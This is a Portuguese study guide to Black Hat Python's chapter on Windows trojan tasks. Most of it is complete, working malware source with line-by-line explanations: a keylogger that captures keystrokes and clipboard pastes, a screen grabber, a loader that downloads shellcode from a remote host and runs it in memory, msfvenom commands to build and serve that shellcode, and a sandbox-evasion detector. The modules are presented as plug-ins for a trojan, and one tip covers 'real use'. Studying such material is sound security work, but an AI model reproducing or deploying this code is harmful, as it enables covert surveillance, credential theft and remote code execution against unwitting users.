# Capítulo 8 — Common Trojaning Tasks on Windows

> Baseado em *Black Hat Python, 2ª Edição* (Justin Seitz & Tim Arnold, No Starch Press, 2021).
> **Atenção:** todos os scripts deste capítulo são **Windows-only**.

## Visão geral

Este capítulo entrega 4 módulos que podem ser plugados no trojan do Capítulo 7:

1. **Keylogger** — captura teclas e clipboard.
2. **Screenshot** — captura a tela inteira via GDI.
3. **Shellcode execution** — baixa e executa shellcode em memória.
4. **Sandbox detection** — detecta se está rodando em sandbox.

Cada um deles expõe (ou pode ser adaptado para expor) uma função `run()` que o trojan chama.

---

## 8.1 — Keylogger `keylogger.py`

**Arquivo:** `keylogger.py`
**Função:** Captura todas as teclas digitadas, associando cada tecla ao processo e janela ativos. Captura também o clipboard em `Ctrl+V`.

### Dependências

```bash
pip install pyWinhook pywin32
```

### Script completo

```python
from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60 * 10


class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512
        )
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        print('\n', process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'[event.Key]')
        return True


def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()
    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


if __name__ == '__main__':
    print(run())
    print('done.')
```

### Explicação linha a linha

#### Imports
| Linha | Código | Explicação |
|-------|--------|------------|
| 1 | `from ctypes import ...` | Funções da API Windows. |
| 2 | `from io import StringIO` | Buffer em memória para redirecionar stdout. |
| 5 | `import pythoncom` | Loop de mensagens COM. |
| 6 | `import pyWinhook as pyHook` | Hooks de teclado/mouse. |
| 9 | `import win32clipboard` | Acesso à área de transferência. |
| 11 | `TIMEOUT = 60*10` | Timeout de 10 minutos. |

#### Classe `KeyLogger`

**`__init__`**
| Linha | Código | Explicação |
|-------|--------|------------|
| 16 | `self.current_window = None` | Armazena título da janela atual. |

**`get_current_process()`**
| Linha | Código | Explicação |
|-------|--------|------------|
| 19 | `hwnd = windll.user32.GetForegroundWindow()` | Handle da janela ativa. |
| 20 | `pid = c_ulong(0)` | Variável para receber o PID. |
| 21 | `windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))` | Obtém PID. |
| 24 | `executable = create_string_buffer(512)` | Buffer para nome do executável. |
| 25 | `h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)` | Abre processo. |
| 26-27 | `windll.psapi.GetModuleBaseNameA(...)` | Nome do executável. |
| 28-29 | `window_title = create_string_buffer(512); GetWindowTextA(...)` | Título da janela. |
| 31-34 | `try/except UnicodeDecodeError` | Decodifica com tratamento. |
| 36 | `print(...)` | Log das informações. |
| 38-39 | `CloseHandle(...)` | Fecha handles. |

**`mykeystroke()`**
| Linha | Código | Explicação |
|-------|--------|------------|
| 41 | `if event.WindowName != self.current_window:` | Detecta mudança de janela. |
| 43-44 | `if 32 < event.Ascii < 127: print(chr(event.Ascii), end='')` | Imprime caractere ASCII. |
| 45-47 | `if event.Key == 'V': ...` | Captura clipboard em Ctrl+V. |
| 51 | `return True` | Permite próximo hook. |

**`run()`**
| Linha | Código | Explicação |
|-------|--------|------------|
| 54-55 | `save_stdout = sys.stdout; sys.stdout = StringIO()` | Redireciona stdout. |
| 56 | `kl = KeyLogger()` | Cria instância. |
| 57 | `hm = pyHook.HookManager()` | Cria gerenciador de hooks. |
| 58 | `hm.KeyDown = kl.mykeystroke` | Registra callback. |
| 59 | `hm.HookKeyboard()` | Instala hook. |
| 60-61 | `while time.thread_time() < TIMEOUT: pythoncom.PumpWaitingMessages()` | Loop até timeout. |
| 62-64 | `log = sys.stdout.getvalue(); sys.stdout = save_stdout; return log` | Recupera log. |

> **Nota:** `time.thread_time()` retorna tempo de CPU da thread, não tempo de parede. Como a thread fica bloqueada em `PumpWaitingMessages()`, o loop pode rodar por muito mais que 10 minutos. Para uso real, troque por `time.time() - start < TIMEOUT` (veja tutorial de integração).

---

## 8.2 — Screenshot `screenshotter.py`

**Arquivo:** `screenshotter.py`
**Função:** Captura a tela inteira (múltiplos monitores) via GDI e salva como `.bmp`.

```python
import base64
import win32api
import win32con
import win32gui
import win32ui


def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)


def screenshot(name='screenshot'):
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt(
        (0, 0), (width, height), img_dc, (left, top),
        win32con.SRCCOPY
    )
    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


def run():
    screenshot()
    with open('screenshot.bmp') as f:
        img = f.read()
    return img


if __name__ == '__main__':
    screenshot()
```

### Explicação linha a linha

| Linha | Código | Explicação |
|-------|--------|------------|
| 9-13 | `get_dimensions()` | Retorna largura/altura/left/top da tela virtual. |
| 17 | `hdesktop = win32gui.GetDesktopWindow()` | Handle da área de trabalho. |
| 20 | `desktop_dc = win32gui.GetWindowDC(hdesktop)` | Device context da tela. |
| 21 | `img_dc = win32ui.CreateDCFromHandle(desktop_dc)` | DC a partir do handle. |
| 22 | `mem_dc = img_dc.CreateCompatibleDC()` | DC em memória. |
| 24-26 | `screenshot = win32ui.CreateBitmap(); ...` | Cria bitmap compatível e o seleciona. |
| 27-28 | `mem_dc.BitBlt(...)` | Copia a tela para o DC de memória. |
| 29 | `screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')` | Salva em disco. |
| 31-32 | `DeleteDC(); DeleteObject(...)` | Limpa recursos. |
| 37 | `screenshot()` | Captura. |
| 38-40 | `with open('screenshot.bmp') as f: img = f.read(); return img` | Lê e retorna bytes. |

---

## 8.3 — Shellcode Execution `shell_exec.py`

**Arquivo:** `shell_exec.py`
**Função:** Baixa shellcode em base64 de um servidor web, decodifica, aloca em memória executável (RWX) e executa sem tocar o disco.

```python
import base64
import ctypes
from urllib import request

kernel32 = ctypes.windll.kernel32


def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode


def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )

    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr


def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()


if __name__ == '__main__':
    url = "http://192.168.1.203:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
```

### Explicação linha a linha

| Linha | Código | Explicação |
|-------|--------|------------|
| 4 | `kernel32 = ctypes.windll.kernel32` | Referência à DLL `kernel32.dll`. |
| 8 | `with request.urlopen(url) as response:` | Abre conexão HTTP. |
| 9 | `shellcode = base64.decodebytes(response.read())` | Decodifica shellcode. |
| 14 | `length = len(buf)` | Tamanho. |
| 16 | `kernel32.VirtualAlloc.restype = ctypes.c_void_p` | Define tipo de retorno. |
| 17-20 | `kernel32.RtlMoveMemory.argtypes = (...)` | Define tipos dos argumentos. |
| 22 | `ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)` | Aloca memória RWX. |
| 23 | `kernel32.RtlMoveMemory(ptr, buf, length)` | Copia shellcode. |
| 24 | `return ptr` | Retorna ponteiro. |
| 28 | `buffer = ctypes.create_string_buffer(shellcode)` | Cria buffer. |
| 29 | `ptr = write_memory(buffer)` | Escreve na memória. |
| 30 | `shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))` | Converte para função. |
| 31 | `shell_func()` | Executa. |

### Gerar shellcode com Metasploit

```bash
$ msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe > shellcode.raw
$ base64 -w 0 -i shellcode.raw > shellcode.bin
$ python -m http.server 8100
```

---

## 8.4 — Sandbox Detection `sandbox_detect.py`

**Arquivo:** `sandbox_detect.py`
**Função:** Detecta se o trojan está rodando em sandbox, monitorando interações do usuário (teclas, cliques, double-clicks) e tempo de atividade do sistema.

```python
from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import time
import win32api


class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_ulong)
    ]


def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)

    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
    run_time = windll.kernel32.GetTickCount()
    elapsed = run_time - struct_lastinputinfo.dwTime
    print(f"[*] It's been {elapsed} milliseconds since the last event.")
    return elapsed


class Detector:
    def __init__(self):
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    def get_key_press(self):
        for i in range(0, 0xff):
            state = win32api.GetAsyncKeyState(i)
            if state & 0x0001:
                if i == 0x1:
                    self.mouse_clicks += 1
                    return time.time()
                elif i > 32 and i < 127:
                    self.keystrokes += 1
        return None

    def detect(self):
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35

        max_double_clicks = 10
        max_keystrokes = random.randint(10, 25)
        max_mouse_clicks = random.randint(5, 25)
        max_input_threshold = 30000

        last_input = get_last_input()
        if last_input >= max_input_threshold:
            sys.exit(0)

        detection_complete = False
        while not detection_complete:
            keypress_time = self.get_key_press()
            if keypress_time is not None and previous_timestamp is not None:
                elapsed = keypress_time - previous_timestamp
                if elapsed <= double_click_threshold:
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        if self.double_clicks >= max_double_clicks:
                            if (keypress_time - first_double_click <=
                                    (max_double_clicks * double_click_threshold)):
                                sys.exit(0)
                if (self.keystrokes >= max_keystrokes and
                        self.double_clicks >= max_double_clicks and
                        self.mouse_clicks >= max_mouse_clicks):
                    detection_complete = True
                previous_timestamp = keypress_time
            elif keypress_time is not None:
                previous_timestamp = keypress_time


if __name__ == '__main__':
    d = Detector()
    d.detect()
    print('okay.')
```

### Explicação linha a linha

| Linha | Código | Explicação |
|-------|--------|------------|
| 8-12 | `class LASTINPUTINFO(Structure)` | Estrutura Windows com `cbSize` e `dwTime`. |
| 15-23 | `get_last_input()` | Calcula ms desde o último input do usuário. |
| 26-29 | `Detector.__init__` | Inicializa contadores. |
| 31-40 | `get_key_press()` | Itera sobre todos os códigos de tecla, detecta cliques (0x1) e teclas ASCII. |
| 42-77 | `detect()` | Loop principal de detecção. |
| 47-50 | `max_double_clicks = 10; max_keystrokes = random.randint(10,25); ...` | Thresholds aleatórios. |
| 52-54 | `last_input = get_last_input(); if last_input >= max_input_threshold: sys.exit(0)` | Se ficou muito tempo sem input → sandbox. |
| 57-77 | `while not detection_complete:` | Loop. |
| 60-67 | Detecção de double-click e saída se muitos em sequência. |
| 68-71 | Se todos os thresholds atingidos → `detection_complete = True`. |

---

## Resumo dos arquivos

| Arquivo | Função | Dependências |
|---------|--------|--------------|
| `keylogger.py` | Captura teclas + clipboard | `pyWinhook`, `pywin32`, `pythoncom` |
| `screenshotter.py` | Captura tela via GDI | `pywin32` |
| `shell_exec.py` | Executa shellcode em memória | `ctypes` (nativo) |
| `sandbox_detect.py` | Detecta sandbox via input | `pywin32` |